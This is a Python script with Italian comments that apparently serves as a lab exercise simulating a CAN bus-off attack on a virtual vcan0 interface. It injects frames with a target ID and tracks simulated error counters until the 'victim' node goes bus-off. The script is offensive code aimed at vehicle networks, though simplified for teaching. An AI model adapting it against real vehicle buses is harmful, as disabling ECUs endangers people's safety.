import can
import time
import sys

# Configurazione
CAN_INTERFACE = 'vcan0'
TARGET_ID = 0x123 
BUS_OFF_THRESHOLD = 256
TEC_PASSIVE_THRESHOLD = 128
INITIAL_TEC = 0
MAX_ATTACKS = 100 # Limite per evitare loop infiniti

def start_attacker():
    """Simula l'attaccante che inietta messaggi malevoli."""
    
    try:
        bus = can.interface.Bus(channel=CAN_INTERFACE, bustype='socketcan')
        print(f"✅ Attaccante connesso a {CAN_INTERFACE}.")
    except OSError as e:
        print(f"❌ Errore di connessione a {CAN_INTERFACE}: {e}")
        return

    # TEC SIMULATI secondo le regole delle slide
    victim_tec = INITIAL_TEC
    adversary_tec = INITIAL_TEC
    attack_counter = 0

    print("\n--- SIMULAZIONE ATTACCO BUS-OFF AVVIATA ---")
    print("Regole TEC: V (Vittima), A (Attaccante)")
    print(f"Fase 1: V_TEC += 8, A_TEC += 8 (Fino a TEC > {TEC_PASSIVE_THRESHOLD})")
    print(f"Fase 2: V_TEC += 7, A_TEC -= 1 (Fino a TEC >= {BUS_OFF_THRESHOLD})")
    print("------------------------------------------")

    while victim_tec < BUS_OFF_THRESHOLD and attack_counter < MAX_ATTACKS:
        
        # 1. Determinazione della Fase e delle regole TEC
        if victim_tec < TEC_PASSIVE_THRESHOLD:
            # Fase 1: Vittima Error-Active [cite: 77]
            # Entrambi salgono di 8 a causa dell'errore attivo [cite: 76]
            victim_tec_change = 8
            adversary_tec_change = 8
            fase_desc = "Fase 1 (Active)"
            
        else:
            # Fase 2: Vittima Error-Passive 
            # La Vittima sale di 8, ma scende di 1 per la corretta esecuzione del ciclo/Passive Flag 
            # L'Attaccante scende di 1 per la trasmissione riuscita 
            victim_tec_change = 7 
            adversary_tec_change = -1 
            fase_desc = "Fase 2 (Passive)"

        
        # 2. Aggiornamento TEC SimulatI
        victim_tec += victim_tec_change
        adversary_tec += adversary_tec_change
        
        # 3. Messaggio di Stato
        print(f"[{fase_desc} - Attacco #{attack_counter+1:02d}] TEC Sim: V={victim_tec} ({victim_tec_change:+d}), A={adversary_tec} ({adversary_tec_change:+d})")
        
        # 4. Controllo critico dell'Attaccante
        if adversary_tec >= BUS_OFF_THRESHOLD:
            print("🚨🚨 [Attaccante] ERRORE: L'Attaccante sta per andare in Bus Off. Interrompo l'attacco!")
            break
        
        # 5. Iniezione del messaggio malevolo (stesso ID e almeno 1 bit dominante in meno)
        # Sfruttiamo il fatto che l'ID è lo stesso, ma il campo Dati/DLC è modificato (dominante 0)
        try:
            msg = can.Message(
                arbitration_id=TARGET_ID,
                data=[0xFF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00], # Dati con bit Dominanti (0) per forzare l'errore [cite: 54, 87]
                is_extended_id=False
            )
            bus.send(msg)
            
        except can.CanError:
            # Questo errore si verifica se l'attaccante stesso va Bus Off (gestito sopra)
            # o per errori di sincronizzazione sul bus.
            print("⚠️ [Attaccante] Errore durante l'invio del messaggio d'attacco.")
            break

        attack_counter += 1
        time.sleep(0.01) # Ciclo di attacco più veloce del ciclo Vittima per sincronizzazione

    print("\n------------------------------------------")
    if victim_tec >= BUS_OFF_THRESHOLD:
        print(f"🎉 VITTORIA! La Vittima ha raggiunto TEC={victim_tec} ed è in Bus Off dopo {attack_counter} attacchi.")
    else:
        print("🛑 Attacco interrotto prematuramente.")
        
    bus.shutdown()

if __name__ == '__main__':
    start_attacker()
